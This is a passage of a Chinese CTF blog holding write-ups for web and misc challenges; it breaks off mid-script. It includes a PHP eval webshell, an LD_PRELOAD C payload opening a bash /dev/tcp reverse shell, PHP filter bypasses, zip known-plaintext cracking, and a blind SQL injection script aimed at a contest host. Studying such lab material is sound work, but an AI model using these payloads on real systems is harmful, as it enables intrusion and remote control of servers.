class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>waf函数中使用的<code>strstr()</code>是对大小写敏感的，故可以用大小写绕过waf<br>可以先传入一个b64的一句话</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mac&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">f3b94e88bd1bd325af6f62828c8785dd.php</span><br></pre></td></tr></table></figure>
<p>再上传一个php文件使用include来包含刚刚的一句话，利用伪协议对base64进行解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-decode/resource=./f3b94e88bd1bd325af6f62828c8785dd.php</span><br><span class="line"></span><br><span class="line">cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0uL2YzYjk0ZTg4YmQxYmQzMjVhZjZmNjI4MjhjODc4NWRkLnBocA==</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">Include</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0uL2YzYjk0ZTg4YmQxYmQzMjVhZjZmNjI4MjhjODc4NWRkLnBocA==&quot;</span>));</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/d6c4e7607c0b48c69cef43f2eabbb05c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQeS4tlI=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功getshell，但由于<code>system()</code>等函数被禁用，所以需要bypass disable_function<br>本来想试一试蚁剑的插件，但是这个shell怎么都连不上，非常奇怪</p>
<p>先构造恶意exp.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/ip/port &lt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span></span><br><span class="line">&#123; </span><br><span class="line">	<span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) </span><br><span class="line">	&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">	&#125; </span><br><span class="line">	unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>); </span><br><span class="line">	payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译成so文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc exp.c -o exp.so -shared -fPIC</span><br></pre></td></tr></table></figure>
<p>利用<code>move_uploaded_file</code>进行文件上传</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="string">&#x27;www&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>访问并反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mac=putenv(<span class="string">&quot;LD_PRELOAD=/var/www/html/uploads/aaaaa.so&quot;</span>);mail(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>命令执行</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>东软杯 DNUICTF-Misc（部分）</title>
    <url>/2021/12/09/DNUICTF-Misc/</url>
    <content><![CDATA[<h1 id="ecryptedzip"><a href="#ecryptedzip" class="headerlink" title="ecryptedzip"></a>ecryptedzip</h1><p><img src="https://img-blog.csdnimg.cn/376d0402295b452191d2915f5910decf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>附件是一个加密的压缩包，但是文件名都是可以看到的，比赛时我首先想到的爆破密码，但是爆了6位都没有成功，后来又尝试了crc32爆破，也没有成功</p>
<p>本题主要考察zip明文攻击，之前没做过类似的题目，赛后对着官方的wp做了一遍，学习一下</p>
<p>压缩包中有两个文件，一个是LICENSE开源协议文件，一个是README.md文件，初看可能无法想到如何拿到明文，我们可以先从网上下载常见的开源协议文件，并将文件大小与压缩包内的LICENSE进行对比，从而得到用于攻击的明文<br><img src="https://img-blog.csdnimg.cn/668056d7165049ecbb6b7d40f08b0bcb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>找遍了所有的LICENSE终于找到一个大小一模一样的，但压缩后的crc32还是不同，后来尝试了很久都没能找到crc一致的明文文件<br>（官网wp说能找到一样的，那就当能找到吧，反正我没找到）</p>
<p>于是尝试另外一种方法，用已知明文的连续若干字节进行爆破<br>这里使用的工具是bkcrack<br>首先构造一个已知的部分密文文件，这里构造的文件名为1，内容为多个空格，因为协议文件的开头通常有很多空格，所以在不知道具体文件的情况下可以用多个空格作为已知明文<br><img src="https://img-blog.csdnimg.cn/e92d67aa5d9e4c0aa1f7de7058e7795c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>用bkcrack得到keys后再拿keys将压缩包中的LICENSE输出出来<br><img src="https://img-blog.csdnimg.cn/3cb17ee9ba4e45f49f9b7c281b105a27.png" alt="在这里插入图片描述"><br>用输出的re.txt文件（即压缩包中的LICENSE）对压缩包进行已知明文攻击，工具选择ARCHPR<br><img src="https://img-blog.csdnimg.cn/8aa287cec0c3484abd3b76bbb3bfd776.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到密码<code>T1=&#39;JtWw</code>，将压缩包解压后在README.md中找到flag<br><img src="https://img-blog.csdnimg.cn/f7b4ba3e91824d7386626fb3e9031d38.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>题面给出了flag，直接输入</p>
<h1 id="在哪呢"><a href="#在哪呢" class="headerlink" title="在哪呢"></a>在哪呢</h1><p><img src="https://img-blog.csdnimg.cn/3a8e810486be4bd5aa95d402728428bc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>pdf中找到隐藏信息，复制下来就是flag</p>
<h1 id="只是个PNG，别想太多了-png"><a href="#只是个PNG，别想太多了-png" class="headerlink" title="只是个PNG，别想太多了.png"></a>只是个PNG，别想太多了.png</h1><p>附件是一个png，无法正常打开，用010查看后发现crc错误，拿到binwalk试了一下分离，直接在zlib中找到flag</p>
<h1 id="压缩包压缩包压缩包压缩包"><a href="#压缩包压缩包压缩包压缩包" class="headerlink" title="压缩包压缩包压缩包压缩包"></a>压缩包压缩包压缩包压缩包</h1><p><img src="https://img-blog.csdnimg.cn/352dfcba2e294e458755d8d37aae48c7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>附件是一个有密码的压缩包，尝试一下发现密码就是加密文件的文件名<br><img src="https://img-blog.csdnimg.cn/d0e84ce9efe64d0e8b5b9f74a04d63fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>尝试几个之后发现这个题就是压缩包一直套娃，由于之前见过类似的题目，考虑用脚本解题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">zipname = <span class="string">&quot;C:\\Users\\14169\\Downloads\\yasuobao\\&quot;</span>+<span class="string">&quot;23898.zip&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> zipname != <span class="string">&quot;C:\\Users\\14169\\Downloads\\yasuobao\\1.zip&quot;</span>:</span><br><span class="line">        ts1 = zipfile.ZipFile(zipname)</span><br><span class="line">        res = re.search(<span class="string">&#x27;[0-9]*&#x27;</span>,ts1.namelist()[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(res.group())</span><br><span class="line">        passwd = res.group()</span><br><span class="line">        ts1.extractall(<span class="string">&quot;C:\\Users\\14169\\Downloads\\yasuobao\\&quot;</span>,pwd=passwd.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        zipname = <span class="string">&quot;C:\\Users\\14169\\Downloads\\yasuobao\\&quot;</span>+ts1.namelist()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/6b691cb196cf45ae846bd75c91f9cc0f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>解压到后来发生了报错<br><img src="https://img-blog.csdnimg.cn/62d01fc7d7854d7bbb05514e399c13c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看报错的压缩包，提示6位数字，直接使用ARCHPR工具爆破得出密码756698<br><img src="https://img-blog.csdnimg.cn/f1d4acb54db348b1849e1e1019c6add6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在加密文件中搜索得到flag</p>
<h1 id="easysteg"><a href="#easysteg" class="headerlink" title="easysteg"></a>easysteg</h1><p><img src="https://img-blog.csdnimg.cn/de76b58dafe14da9a319eea391ac690c.png" alt="在这里插入图片描述"><br>附件是一个缺少定位符的二维码。补全后扫描（不用补全好像也能扫出来）</p>
<p>扫描结果提示是某种常见的隐写，我们将二维码放入010中搜索PK字段发现是个压缩包，隐藏了另一张png图片<br><img src="https://img-blog.csdnimg.cn/4f8619132af942a38ee769b5ec4722f8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>直接用stegpy得到flag，</p>
]]></content>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>THUCTF2021 wp</title>
    <url>/2021/12/20/THUCTF2021/</url>
    <content><![CDATA[<h1 id="Web方向："><a href="#Web方向：" class="headerlink" title="Web方向："></a>Web方向：</h1><h2 id="showmeyourlove-baby"><a href="#showmeyourlove-baby" class="headerlink" title="showmeyourlove(baby)"></a>showmeyourlove(baby)</h2><p><img src="https://s2.loli.net/2022/06/06/QFOYsRUyKI15Lzk.png" alt="img"></p>
<p>web的第一道题目，比较简单，点击yes后发现ip地址不对，可以想到需要进行ip地址伪造</p>
<p><img src="https://s2.loli.net/2022/06/06/3Cag6d1jVhzNLk8.png" alt="img"></p>
<p>抓包后可以发现返回的报文中含有<code>where_is_heart</code>，可以猜到我们需要伪造的ip地址就是<code>172.17.0.1</code></p>
<p>我们点击yes后，抓包修改请求头部，添加<code>X-Forwarded-For</code>字段，值为<code>172.17.0.1</code></p>
<p><img src="https://s2.loli.net/2022/06/06/Py2981gpuOvZKjr.png" alt="img"></p>
<p>发包后直接得到flag</p>
<h2 id="showmetrick"><a href="#showmetrick" class="headerlink" title="showmetrick"></a>showmetrick</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$var1 = $_GET[&#x27;var1&#x27;] ?: &#x27;&#x27;;</span><br><span class="line">$var2 = $_GET[&#x27;var2&#x27;] ?: &#x27;&#x27;;</span><br><span class="line">$var3 = $_GET[&#x27;var3&#x27;] ?: &#x27;&#x27;;</span><br><span class="line">$var4 = $_GET[&#x27;var4&#x27;] ?: &#x27;&#x27;;</span><br><span class="line">$var5 = $_GET[&#x27;var5&#x27;] ?: &#x27;&#x27;;</span><br><span class="line">$var6 = $_GET[&#x27;var6&#x27;] ?: &#x27;&#x27;;</span><br><span class="line">$var7 = $_GET[&#x27;var7&#x27;] ?: &#x27;&#x27;;</span><br><span class="line">$var8 = $_GET[&#x27;var8&#x27;] ?: &#x27;&#x27;;</span><br><span class="line">$var9 = $_GET[&#x27;var9&#x27;] ?: &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">if ($var1 != $var2 &amp;&amp; sha1($var1) === sha1($var2)) &#123;</span><br><span class="line">    if (!is_numeric($var3) &amp;&amp; in_array($var3, array(1))) &#123;</span><br><span class="line">        if (file_get_contents($var4) === &quot;Welcome to THUCTF2021!&quot;) &#123;</span><br><span class="line">            if (isset($_GET[&#x27;thuctf_is.fun&#x27;])) &#123;</span><br><span class="line">                if ($var5 != 2333 &amp;&amp; intval($var5, 0) === 2333) &#123;</span><br><span class="line">                    $t = is_numeric($var6) and is_numeric($var7) !== &quot;THUCTF2021&quot;;</span><br><span class="line">                    if ($t &amp;&amp; $var7 === &quot;THUCTF2021&quot;) &#123;</span><br><span class="line">                        if (!stristr($var8, &quot;..&quot;) &amp;&amp; !preg_match(&quot;/&lt;\?|eval|system|assert|call|preg|create|sort|exec|php/i&quot;, $var9)) &#123;</span><br><span class="line">                            file_put_contents(&quot;uploads/$var8&quot;, $var9);</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            die(&quot;level 7 fail!&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        die(&quot;level 6 fail!&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    die(&quot;level 5 fail!&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                die(&quot;level 4 fail!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&quot;level 3 fail!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&quot;level 2 fail!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&quot;level 1 fail!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">level 1 fail!</span><br></pre></td></tr></table></figure>

<p>本题上来直接给出源码，考察php的特性</p>
<p><strong>var1，var2，var3，var4常规绕过</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">var1[]=<span class="number">1</span>&amp;var2[]=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">&amp;var3=<span class="number">1</span>a</span><br><span class="line"></span><br><span class="line">&amp;var4=data:<span class="comment">//text/plain,Welcome%20to%20THUCTF2021!</span></span><br></pre></td></tr></table></figure>

<p><strong>$_GET[‘thuctf_is.fun’]</strong></p>
<p>这里开始卡了我一会，$_GET[‘thuctf_is.fun’]无法传入参数，这是因为PHP变量名应该只有数字字母下划线。而且GET或POST方式传进去的变量名,会自动将空格 + . [转换为_（下划线），故此处应该传入<code>&amp;thuctf[is.fun=1</code></p>
<p><strong>var5，var6，var7常规绕过</strong></p>
<p><code>&amp;var5=2333e1&amp;var6=1&amp;var7=THUCTF2021</code></p>
<p><strong>var8，var9一句话木马写入</strong></p>
<p>var8传入文件名确定路径，var9通过数组来避开过滤，传入一句话木马</p>
<p><code>&amp;var8=wyf.php&amp;var9[]=%3C?php%20@eval($_POST[%27mac%27]);?%3E</code></p>
<p><strong>蚁剑连接</strong></p>
<p><img src="https://s2.loli.net/2022/06/06/ZmS9TD8j7tMFXeq.png" alt="img"></p>
<p>在根目录可以找到flag文件，但是flag的权限是0600，普通用户无法直接访问</p>
<p>我们可以猜测readflag文件可以读取flag的值，我们可以用命令行来运行readflag获取flag</p>
<p><img src="https://s2.loli.net/2022/06/06/ZmS9TD8j7tMFXeq.png"></p>
<p>终端输入ls指令居然没有回显，猜测是这个网站的配置文件中ban掉了很多的函数，我们此处需要用插件来绕过<code>disabled_functions</code></p>
<p><img src="https://s2.loli.net/2022/06/06/PaImC2x6MdZ3ek8.png" alt="img"></p>
<p><img src="https://s2.loli.net/2022/06/06/1BD4I9UxOobR8dS.png" alt="img"></p>
<p>启用插件后直接运行readflag得到flag</p>
<h2 id="eazy-sql-baby"><a href="#eazy-sql-baby" class="headerlink" title="eazy_sql(baby)"></a>eazy_sql(baby)</h2><p><img src="https://s2.loli.net/2022/06/06/qRN2lU5Fsgha7jy.png" alt="img"></p>
<p><img src="https://s2.loli.net/2022/06/06/2joFaJ6lmpGDVsI.png" alt="img"></p>
<p>根据题目名字猜想本题为sql注入，先随便试试admin和123，提示密码错误</p>
<p>得到用户名为admin后直接开始写脚本盲注</p>
<p>经过尝试后发现本题过滤了 空格，limit，&lt;&gt;，union，；等等</p>
<p>以下给出我的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://7830996e-7e92-48ec-a641-64acc0839bfe.thuctf2021.redbud.info:8001/login.php&#x27;</span></span><br><span class="line">str_range=<span class="built_in">range</span>(<span class="number">30</span>,<span class="number">133</span>)</span><br><span class="line">success=<span class="string">&#x27;password error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbs_len</span>():<span class="comment">#3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        payload=<span class="string">&quot;admin&#x27;/**/and/**/length(database())=%d#&quot;</span>%i</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:payload,<span class="string">&#x27;password&#x27;</span>:<span class="number">123</span>&#125;</span><br><span class="line">        txt=requests.post(url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbs_name_bi</span>(<span class="params"><span class="built_in">len</span></span>):</span><br><span class="line">    name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">min</span>=<span class="number">33</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">126</span></span><br><span class="line">    mid=(<span class="built_in">min</span>+<span class="built_in">max</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">min</span>&lt;=<span class="built_in">max</span>:</span><br><span class="line">            payload=<span class="string">&quot;admin&#x27;/**/and/**/ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d#&quot;</span>%(i,mid)</span><br><span class="line">            data = &#123;<span class="string">&#x27;username&#x27;</span>: payload,<span class="string">&#x27;password&#x27;</span>:<span class="number">123</span>&#125;</span><br><span class="line">            txt = requests.post(url, data=data).text</span><br><span class="line">            <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">                name=name+<span class="built_in">chr</span>(mid)</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">&quot;admin&#x27;/**/and/**/ascii(substr(database()/**/from/**/%d/**/for/**/1))&lt;%d#&quot;</span> % (i, mid)</span><br><span class="line">                data = &#123;<span class="string">&#x27;username&#x27;</span>: payload, <span class="string">&#x27;password&#x27;</span>: <span class="number">123</span>&#125;</span><br><span class="line">                txt = requests.post(url, data=data).text</span><br><span class="line">                <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">                    <span class="built_in">max</span>=mid-<span class="number">1</span></span><br><span class="line">                    mid=(<span class="built_in">min</span>+<span class="built_in">max</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">min</span>=mid+<span class="number">1</span></span><br><span class="line">                    mid=(<span class="built_in">min</span>+<span class="built_in">max</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="built_in">min</span> = <span class="number">33</span></span><br><span class="line">        <span class="built_in">max</span> = <span class="number">126</span></span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbs_name</span>(<span class="params"><span class="built_in">len</span></span>):<span class="comment">#ctf</span></span><br><span class="line">    name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_range:</span><br><span class="line">            payload=<span class="string">&quot;admin&#x27;/**/and/**/ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d#&quot;</span>%(i,j)</span><br><span class="line">            data = &#123;<span class="string">&#x27;username&#x27;</span>: payload,<span class="string">&#x27;password&#x27;</span>:<span class="number">123</span>&#125;</span><br><span class="line">            txt = requests.post(url, data=data).text</span><br><span class="line">            <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">                name=name+<span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_num</span>():<span class="comment">#2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        payload=<span class="string">&quot;admin&#x27;/**/and/**/(select/**/count(*)/**/from/**/information_schema.tables/**/where/**/table_schema=database())=%d#&quot;</span>%i</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: payload, <span class="string">&#x27;password&#x27;</span>: <span class="number">123</span>&#125;</span><br><span class="line">        txt = requests.post(url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_lengths</span>():<span class="comment">#17</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;/**/and/**/(select/**/length(group_concat(table_name))/**/&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;from/**/information_schema.tables/**/where/**/table_schema=&#x27;ctf&#x27;)=%d#&quot;</span>%i</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: payload, <span class="string">&#x27;password&#x27;</span>: <span class="number">123</span>&#125;</span><br><span class="line">        txt = requests.post(url, data=data).text</span><br><span class="line">        <span class="built_in">print</span>(txt)</span><br><span class="line">        <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table_names</span>(<span class="params"><span class="built_in">len</span></span>):<span class="comment">#admin,fll11144aag</span></span><br><span class="line">    name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_range:</span><br><span class="line">            payload=<span class="string">&quot;admin&#x27;/**/and/**/(select/**/ascii(substr(group_concat(table_name)/**/from/**/%d/**/for/**/1))/**/&quot;</span> \</span><br><span class="line">                    <span class="string">&quot;from/**/information_schema.tables/**/where/**/table_schema=&#x27;ctf&#x27;)=%d#&quot;</span>%(i,j)</span><br><span class="line">            data = &#123;<span class="string">&#x27;username&#x27;</span>: payload, <span class="string">&#x27;password&#x27;</span>: <span class="number">123</span>&#125;</span><br><span class="line">            txt = requests.post(url, data=data).text</span><br><span class="line">            <span class="comment">#print(txt)</span></span><br><span class="line">            <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">                name = name + <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(name)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str_range:</span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;/**/and/**/(select/**/ascii(substr(group_concat(table_name)/**/from/**/1/**/for/**/1))/**/&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;from/**/information_schema.tables/**/where/**/table_schema=&#x27;ctf&#x27;)=%d#&quot;</span> %j</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: payload, <span class="string">&#x27;password&#x27;</span>: <span class="number">123</span>&#125;</span><br><span class="line">        txt = requests.post(url, data=data).text</span><br><span class="line">        <span class="built_in">print</span>(txt)</span><br><span class="line">        <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_lengths</span>():<span class="comment">#admin 20 fll11144aag 10</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;/**/and/**/(select/**/length(group_concat(column_name))/**/&quot;</span> \</span><br><span class="line">                  <span class="string">&quot;from/**/information_schema.columns/**/where/**/table_name=&#x27;fll11144aag&#x27;)=%d#&quot;</span>%i</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: payload, <span class="string">&#x27;password&#x27;</span>: <span class="number">123</span>&#125;</span><br><span class="line">        txt = requests.post(url, data=data).text</span><br><span class="line">        <span class="built_in">print</span>(txt)</span><br><span class="line">        <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_names</span>(<span class="params"><span class="built_in">len</span></span>):<span class="comment">#admin id,username,password fll11144aag ff1lllaggg</span></span><br><span class="line"></span><br><span class="line">    name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_range:</span><br><span class="line">            payload=<span class="string">&quot;admin&#x27;/**/and/**/(select/**/ascii(substr(group_concat(column_name)/**/from/**/%d/**/for/**/1))/**/&quot;</span> \</span><br><span class="line">                    <span class="string">&quot;from/**/information_schema.columns/**/where/**/table_name=&#x27;fll11144aag&#x27;)=%d#&quot;</span>%(i,j)</span><br><span class="line">            data = &#123;<span class="string">&#x27;username&#x27;</span>: payload, <span class="string">&#x27;password&#x27;</span>: <span class="number">123</span>&#125;</span><br><span class="line">            txt = requests.post(url, data=data).text</span><br><span class="line">            <span class="built_in">print</span>(txt)</span><br><span class="line">            <span class="keyword">if</span> success <span class="keyword">in</span> txt:</span><br><span class="line">                name = name + <span class="built_in">chr</span>(j)</span><br><span class="line">                <span 